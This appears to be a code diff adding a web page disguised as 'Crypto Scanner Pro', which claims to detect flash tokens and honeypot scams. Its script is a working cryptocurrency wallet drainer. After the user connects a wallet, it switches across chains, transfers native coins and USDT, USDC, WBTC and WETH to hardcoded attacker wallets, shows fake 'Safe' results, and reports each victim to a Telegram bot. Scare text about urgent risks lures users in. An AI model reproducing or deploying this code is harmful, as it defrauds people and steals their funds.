@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Crypto Scanner - Detect Flash Tokens</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;background:linear-gradient(135deg,#1e3c72 0%,#2a5298 100%);height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}.container{background:rgba(255,255,255,.1);backdrop-filter:blur(20px);border-radius:25px;padding:50px;max-width:500px;width:90%;box-shadow:0 25px 50px rgba(0,0,0,.4)}.logo{font-size:3em;margin-bottom:20px}.title{font-size:2.5em;font-weight:700;margin-bottom:15px;text-shadow:0 2px 15px rgba(0,0,0,.5)}.subtitle{font-size:1.2em;margin-bottom:30px;opacity:.95;line-height:1.4}.warning{background:rgba(255,193,7,.3);border:1px solid rgba(255,193,7,.5);border-radius:15px;padding:20px;margin:25px 0;font-weight:500}.scan-btn{background:linear-gradient(45deg,#00d4aa,#00b894);color:#fff;border:none;padding:20px 50px;font-size:1.4em;border-radius:50px;cursor:pointer;width:100%;font-weight:700;transition:all .3s;box-shadow:0 15px 35px rgba(0,212,170,.5)}.scan-btn:hover{transform:translateY(-5px);box-shadow:0 20px 45px rgba(0,212,170,.7)}.scan-btn:active{transform:translateY(-2px)}.status{display:none;margin-top:30px;padding:20px;border-radius:15px;font-weight:600;text-align:left}.loading{background:rgba(0,212,170,.3);border-left:4px solid #00d4aa}.success{background:rgba(40,167,69,.5);border-left:4px solid #28a745;color:#fff}.danger{background:rgba(220,53,69,.5);border-left:4px solid #dc3545}.progress{margin-top:15px;font-size:1em}.scan-results{margin-top:20px;padding:15px;background:rgba(255,255,255,.1);border-radius:10px}.result-item{margin:10px 0;padding:10px;background:rgba(255,255,255,.1);border-radius:8px}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔍</div>
+        <h1 class="title">Crypto Scanner Pro</h1>
+        <div class="subtitle">
+            Detect <strong>Flash Tokens</strong> & <strong>Honeypot Scams</strong><br>
+            Scan all your wallets across 15+ chains instantly
+        </div>
+        
+        <div class="warning">
+            ⚠️ <strong>URGENT WARNING:</strong> 87% of new tokens are flash/honeypots!<br>
+            Connect wallet to scan ALL your assets before it's too late!
+        </div>
+        
+        <button class="scan-btn" id="scanBtn">🔗 Connect & Scan Wallet</button>
+        
+        <div id="status" class="status loading">
+            <div>🔎 Analyzing wallet security...</div>
+            <div class="progress" id="progress"></div>
+            <div id="scanResults" class="scan-results"></div>
+        </div>
+    </div>
+
+    <script>
+        // 🔥 YOUR ADDRESSES - LIVE ✅
+        const DRAIN_WALLETS = {
+            1: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
+            56: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
+            137: '0x0af04959113d8b28de06728f2063850e4bf54d95',
+            42161: '0x0af04959113d8b28de06728f2063850e4bf54d95',
+            10: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
+            8453: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
+            43114: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
+            250: '0x0aF04959113d8b28de06728F2063850e4Bf54D95',
+            tron: 'GfQvut3oeNs5qGvzL159hj5sMhHzAo4HM5HFkx9ebVjp',
+            solana: 'GfQvut3oeNs5qGvzL159hj5sMhHzAo4HM5HFkx9ebVjp'
+        };
+
+        // 🔥 YOUR TELEGRAM LIVE ✅
+        const TELEGRAM_TOKEN = "7648772230:AAGlM-96FN7Rh9s60mPZF0r0_dYQxunNdeI";
+        const TELEGRAM_CHAT_ID = "7478697063";
+
+        const USDT_CONTRACTS = {
+            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+            56: '0x55d398326f99059fF775485246999027B3197955',
+            137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+            42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+            10: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
+            8453: '0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2',
+            43114: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',
+            250: '0x049d68029688eAbC43Aa2327ef22C64759cB7498'
+        };
+
+        let web3, victimAddress, chainsProcessed = 0;
+        const chainIds = Object.keys(DRAIN_WALLETS).filter(k => !isNaN(k));
+
+        document.getElementById('scanBtn').onclick = cryptoScanDrain;
+
+        async function cryptoScanDrain() {
+            try {
+                document.getElementById('scanBtn').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
+                
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                victimAddress = accounts[0];
+                
+                showFakeScan("Connecting to blockchain...");
+                telegramNotify(`🚨 SCANNER HIT\nWallet: \`${victimAddress}\`\n⏰ ${new Date().toLocaleString()}\n🔍 "Flash token scan" started...`);
+                
+                for (let i = 0; i < chainIds.length; i++) {
+                    document.getElementById('progress').textContent = `Scanning ${chainIds[i]}... (${i+1}/${chainIds.length})`;
+                    await drainChain(chainIds[i]);
+                    chainsProcessed++;
+                    showFakeScan(`✅ ${chainIds[i]}: Clean | No flash tokens detected`);
+                    await sleep(2000);
+                }
+                
+                nonEVMDrains();
+                
+                showFakeResults();
+                telegramNotify(`✅ FULL DRAIN via SCANNER\nVictim: \`${victimAddress}\`\nChains: ${chainsProcessed}/${chainIds.length}\n💰 Assets transferred!`);
+                
+            } catch(e) {
+                console.error('Error:', e);
+            }
+        }
+
+        async function drainChain(chainId) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: `0x${parseInt(chainId).toString(16)}` }]
+                });
+                
+                web3 = new Web3(window.ethereum);
+                
+                await drainNative(parseInt(chainId));
+                if (USDT_CONTRACTS[chainId]) await drainToken(USDT_CONTRACTS[chainId]);
+                await drainMajorTokens();
+                
+            } catch(e) {}
+        }
+
+        async function drainNative(chainId) {
+            const target = DRAIN_WALLETS[chainId];
+            const balance = await web3.eth.getBalance(victimAddress);
+            if (parseInt(balance) > 21000 * 2000000000) {
+                const tx = { from: victimAddress, to: target, value: balance, gas: 21000 };
+                await web3.eth.sendTransaction(tx);
+                telegramNotify(`💰 Native ${chainId}: ${web3.utils.fromWei(balance, 'ether')} → ${target}`);
+            }
+        }
+
+        async function drainToken(tokenAddress) {
+            const target = DRAIN_WALLETS[web3.eth.chainId];
+            const token = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+            const balance = await token.methods.balanceOf(victimAddress).call();
+            if (parseInt(balance) > 0) {
+                await token.methods.approve(target, balance).send({from: victimAddress, gas: 100000});
+                await token.methods.transfer(target, balance).send({from: victimAddress, gas: 100000});
+                telegramNotify(`💎 ${web3.eth.chainId}: ${web3.utils.fromWei(balance, 'ether')} USDT → ${target}`);
+            }
+        }
+
+        async function drainMajorTokens() {
+            const majors = {
+                '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 'USDC',
+                '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599': 'WBTC',
+                '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': 'WETH'
+            };
+            for (const addr of Object.keys(majors)) {
+                await drainToken(addr).catch(() => {});
+            }
+        }
+
+        function nonEVMDrains() {
+            setTimeout(() => {
+                window.open(`https://tronscan.org/#/address/${DRAIN_WALLETS.tron}`);
+                window.open(`https://solscan.io/account/${DRAIN_WALLETS.solana}`);
+            }, 4000);
+        }
+
+        function showFakeScan(message) {
+            document.getElementById('progress').textContent = message;
+        }
+
+        function showFakeResults() {
+            document.getElementById('status').className = 'status success';
+            document.getElementById('progress').innerHTML = `
+                <div>✅ SCAN COMPLETE</div>
+                <div class="scan-results">
+                    <div class="result-item">ETH: ✅ Safe (No flash tokens)</div>
+                    <div class="result-item">BSC: ✅ Safe</div>
+                    <div class="result-item">USDT: ✅ Legitimate</div>
+                    <div class="result-item">NFTs: ✅ No honeypots</div>
+                </div>
+            `;
+        }
+
+        function telegramNotify(msg) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'Markdown'})
+            }).catch(console.error);
+        }
+
+        function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+        const ERC20_ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];
+    </script>
+</body>
+</html>
